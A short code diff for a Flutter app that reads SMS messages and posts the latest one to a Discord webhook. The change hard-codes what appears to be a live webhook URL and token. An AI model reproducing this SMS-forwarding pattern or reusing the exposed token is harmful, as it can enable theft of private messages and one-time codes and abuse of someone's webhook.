@@ -2,6 +2,7 @@ import 'package:flutter/material.dart';
 import 'package:telephony/telephony.dart';
 import 'package:http/http.dart' as http;
 import 'dart:async';
+import 'dart:convert';
 
 void main() {
   runApp(MyApp());
@@ -54,7 +55,7 @@ class _SMSReaderAppState extends State<SMSReaderApp> {
   Future<void> _sendLastMessageToDiscord() async {
     if (smsMessages.isNotEmpty) {
       final lastMessage = smsMessages.last;
-      final discordWebhookURL = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL
+      final discordWebhookURL = 'https://discord.com/api/webhooks/1165290854416646225/NFI2Puw2SYeWNetzEm9sr_KtCSjEA-6CS54hTQZDCy7LD-EYLuv0rM2oioO7ObazFZvU'; // Replace with your Discord webhook URL
 
       final response = await http.post(
         Uri.parse(discordWebhookURL),
